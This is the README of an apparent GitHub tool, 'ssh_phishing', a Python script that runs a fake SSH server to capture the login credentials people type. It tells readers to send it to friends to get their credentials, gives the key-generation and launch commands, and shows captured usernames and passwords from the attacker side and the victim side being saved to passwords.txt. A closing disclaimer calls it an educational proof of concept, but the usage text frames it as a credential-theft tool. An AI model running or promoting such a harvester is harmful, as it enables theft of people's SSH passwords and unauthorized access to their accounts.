# ssh_phishing

A python script that creates a dummy ssh server. Send to your friends to get credentials.

To generate a key use: `ssh-keygen -t rsa -b 4096 -C 'bre@rodri.guez' -f rsa_key`

Run with the key file and port as argument: `python3 ssh_phishing.py rsa_key 6666`

### The server
```
$ python ssh_phishing.py rsa_key 6666
Waiting for connections on port 6666...
Connection from: 127.0.0.1
Waiting for authentication...
Username: m.user
Password: my_pass
------------------------------
Username: m.user
Password: 123456
------------------------------
Username: m.user
Password: 123456
```

### The victim
```
$ ssh m.user@localhost -p 6666
m.user@localhost's password: 
Permission denied, please try again.
m.user@localhost's password: 
Permission denied, please try again.
m.user@localhost's password: 
m.user@localhost: Permission denied (password).
$
```

Output is saved to a file in the current working directory called `passwords.txt`.

# Ethical Warning and Responsibility Disclaimer

**Important:** This repository contains proof-of-concept (PoC) code intended solely for educational and research purposes. The misuse of this code for malicious activities, including but not limited to phishing, unauthorized hacking, or any form of security compromise, is strictly prohibited.

The author of this repository does not endorse, support, or encourage any illegal or harmful activities. By accessing and using this code, you agree to do so in accordance with the applicable laws and regulations in your jurisdiction.

**Disclaimer of Responsibility:**
- This code is provided "as is," without any express or implied warranties of any kind.
- The author assumes no responsibility for damages, legal or otherwise, arising from the use of this code.

Please use this code ethically and legally, respecting the privacy and security of others.
